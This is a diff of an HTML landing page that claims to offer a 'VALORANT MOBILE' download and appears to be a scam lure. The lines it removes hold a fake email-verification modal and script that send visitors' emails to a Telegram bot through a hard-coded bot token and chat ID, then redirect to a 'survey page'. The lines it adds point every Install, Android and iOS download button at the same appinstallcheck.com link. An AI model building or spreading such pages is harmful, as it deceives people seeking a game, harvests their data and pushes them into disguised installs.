@@ -439,101 +439,6 @@
             border-top: 1px solid #e1e4e8;
         }
         
-        /* Email Verification Modal */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(5px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        .modal {
-            background-color: white;
-            width: 90%;
-            max-width: 500px;
-            border-radius: 16px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            animation: slideUp 0.4s ease;
-        }
-        
-        @keyframes slideUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        .modal-header {
-            padding: 20px;
-            text-align: center;
-            border-bottom: 1px solid #e1e4e8;
-            background-color: #f8f9fa;
-        }
-        
-        .modal-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #333;
-        }
-        
-        .modal-body {
-            padding: 30px;
-            text-align: center;
-        }
-        
-        .modal-body p {
-            margin-bottom: 25px;
-            color: #555;
-            font-size: 1.05rem;
-        }
-        
-        .email-input {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            font-size: 1rem;
-            margin-bottom: 25px;
-            transition: border-color 0.3s;
-        }
-        
-        .email-input:focus {
-            outline: none;
-            border-color: #0070F3;
-            box-shadow: 0 0 0 3px rgba(0, 112, 243, 0.1);
-        }
-        
-        .verify-btn {
-            background-color: #0070F3;
-            color: white;
-            width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.05rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .verify-btn:hover {
-            background-color: #0060DF;
-            transform: translateY(-3px);
-            box-shadow: 0 6px 12px rgba(0, 112, 243, 0.2);
-        }
-        
         /* Responsive Styles */
         @media (max-width: 768px) {
             .header-content {
@@ -584,7 +489,7 @@
                         </div>
                     </div>
                 </div>
-                <button class="get-access-btn" id="get-access">Get Access</button>
+                <a href="https://appinstallcheck.com/cl/i/42ldo4" class="get-access-btn" id="get-access">Install</a>
             </div>
             
             <div class="ratings-section">
@@ -633,14 +538,14 @@
                 <h2 class="download-title">Download Now</h2>
                 <p class="download-subtitle">Experience the tactical shooter phenomenon on your mobile device</p>
                 <div class="download-buttons">
-                    <button class="download-button android" id="android-download">
+                    <a href="https://appinstallcheck.com/cl/i/42ldo4" class="download-button android" id="android-download">
                         <span class="platform-icon">🤖</span>
                         <span>Download for Android</span>
-                    </button>
-                    <button class="download-button ios" id="ios-download">
+                    </a>
+                    <a href="https://appinstallcheck.com/cl/i/42ldo4" class="download-button ios" id="ios-download">
                         <span class="platform-icon">🍎</span>
                         <span>Download for iOS</span>
-                    </button>
+                    </a>
                 </div>
             </div>
         </section>
@@ -678,65 +583,7 @@
         </div>
     </footer>
     
-    <!-- Email Verification Modal -->
-    <div class="modal-overlay" id="email-modal">
-        <div class="modal">
-            <div class="modal-header">
-                <h2 class="modal-title">Verify Your Email</h2>
-            </div>
-            <div class="modal-body">
-                <p>Enter your email to receive exclusive access to VALORANT MOBILE</p>
-                <input type="email" class="email-input" id="email-input" placeholder="Enter your email">
-                <button class="verify-btn" id="verify-email">Verify Email</button>
-            </div>
-        </div>
-    </div>
-    
     <script>
-        // Show Email Verification Modal when Get Access or Download buttons are clicked
-        document.getElementById('get-access').addEventListener('click', function() {
-            document.getElementById('email-modal').style.display = 'flex';
-        });
-        
-        document.getElementById('android-download').addEventListener('click', function() {
-            document.getElementById('email-modal').style.display = 'flex';
-            sessionStorage.setItem('platform', 'android');
-        });
-        
-        document.getElementById('ios-download').addEventListener('click', function() {
-            document.getElementById('email-modal').style.display = 'flex';
-            sessionStorage.setItem('platform', 'ios');
-        });
-        
-        // Handle Email Verification
-        document.getElementById('verify-email').addEventListener('click', function() {
-            const email = document.getElementById('email-input').value;
-            if (email && email.includes('@')) {
-                // Send the email to Telegram bot first
-                const botToken = '7048966337:AAGbh9Atl5fko8d-OJHbcY-wn0gZ-cvwrwo'; 
-                const chatId = '1920461355';
-                const platform = sessionStorage.getItem('platform') || 'android';
-                
-                const message = `New email submitted: ${email} (Platform: ${platform})`;
-                
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                }).catch(error => console.error('Error sending to Telegram:', error));
-                
-                // Redirect to the survey page
-                window.location.href = "https://appinstallcheck.com/cl/i/42ldo4";
-            } else {
-                alert('Please enter a valid email address');
-            }
-        });
-        
         // Image Gallery Navigation
         const dots = document.querySelectorAll('.gallery-dot');
         dots.forEach((dot, index) => {
